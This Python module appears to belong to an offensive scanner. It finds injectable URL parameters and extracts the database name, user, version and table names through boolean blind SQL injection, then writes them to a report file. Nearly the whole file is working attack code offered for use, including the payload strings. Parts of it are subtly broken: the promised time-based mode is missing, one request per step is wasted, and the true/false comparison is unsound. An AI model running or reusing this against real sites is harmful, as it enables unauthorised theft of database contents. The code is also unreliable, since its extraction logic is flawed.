"""sqli_dump — blind SQLi data extraction via boolean/time-based binary search"""
import time, re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient
from pathlib import Path

# queries for extraction order
QUERIES = [
    ("db_name",     "SELECT database()"),
    ("db_user",     "SELECT current_user()"),
    ("db_version",  "SELECT version()"),
    ("tables",      "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"),
]

class SqliDump:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)
        u = urlparse(target)
        params = parse_qs(u.query) or {"id": ["1"]}

        # find vulnerable param first (quick check)
        param = self._find_param(http, u, params)
        if not param:
            print("[sqli_dump] no injectable param detected via simple check")
            return {"dumped": False}

        print(f"[sqli_dump] vulnerable param: {param}")

        # output dir
        out_dir = Path("reports") / "dump"
        out_dir.mkdir(parents=True, exist_ok=True)
        out_file = out_dir / f"sqli_{target.split('//')[-1].split('/')[0]}.txt"

        results = {}
        for name, query in QUERIES:
            print(f"  extracting {name}...", flush=True)
            val = self._blind_extract(http, u, params, param, query, max_len=200)
            if val:
                results[name] = val
                print(f"    {name} = {val}")
                logger.finding("sqli_dump", "critical", f"{name}={val}")
            else:
                print(f"    {name}: extraction failed")

        out_file.write_text("\n".join(f"{k}: {v}" for k, v in results.items()))
        print(f"[sqli_dump] saved to {out_file}")
        return {"dumped": bool(results), "results": results}

    def _find_param(self, http, u, params):
        for name in params:
            for test in ["' AND '1'='1", "' AND '1'='2"]:
                q = dict(params); q[name] = [test]
                url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
                r = http.get(url)
                if not r: continue
                if any(m in r.text.lower() for m in ["sql syntax","mysql","syntax error","quoted string"]):
                    return name
        return None

    def _blind_extract(self, http, u, params, param, query, max_len=64):
        """extract string via boolean-based binary search per char"""
        result = ""
        for pos in range(1, max_len + 1):
            char_code = self._binary_search_char(http, u, params, param, query, pos)
            if char_code is None or char_code == 0:
                break
            result += chr(char_code)
            if char_code in (44, 0):  # comma (multi-result separator) - stop after second
                pass
        return result.strip()

    def _binary_search_char(self, http, u, params, param, query, pos):
        # use ASCII comparison: substring((query), pos, 1) > mid
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -"
            q = dict(params); q[param] = [payload]
            url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
            r = http.get(url)
            if not r: return None
            # if TRUE condition — response differs from FALSE baseline
            # use length heuristic: TRUE has "normal" size, FALSE smaller
            if self._is_true(http, u, params, param, query, pos, mid):
                lo = mid + 1
            else:
                hi = mid - 1
        # final check
        if lo == 32:
            return None  # no data at this position
        return lo

    def _is_true(self, http, u, params, param, query, pos, mid):
        # compare length of TRUE vs FALSE probes
        true_payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -"
        false_payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))={mid}-- -"
        q1 = dict(params); q1[param] = [true_payload]
        q2 = dict(params); q2[param] = [false_payload]
        r1 = http.get(urlunparse(u._replace(query=urlencode(q1, doseq=True))))
        r2 = http.get(urlunparse(u._replace(query=urlencode(q2, doseq=True))))
        if not (r1 and r2): return False
        # TRUE (mid greater than actual) fails -> shorter; if r1 longer than r2 => mid < actual
        return len(r1.content) > len(r2.content)
